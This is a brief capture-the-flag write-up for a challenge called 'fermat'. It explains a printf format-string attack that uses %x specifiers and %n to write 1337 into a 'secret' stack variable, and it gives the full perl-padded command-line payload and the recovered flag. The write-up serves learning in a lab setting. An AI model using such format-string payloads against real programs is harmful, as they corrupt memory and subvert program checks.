Using printf's %n operator we can write a character 1337 times and get that number into the next variable on the stack.
we need to get the `secret` variable on top of the stack and we can do that by putting a couple of `%x` before `%n` and ofcourse make sure we accommodate for it in the number of characters.
we could do this like `./fermat "$(perl -e 'print "a"x1290')%x %x %x %x %x %x %n"`
flag: `flag_fermats_last_exploit`
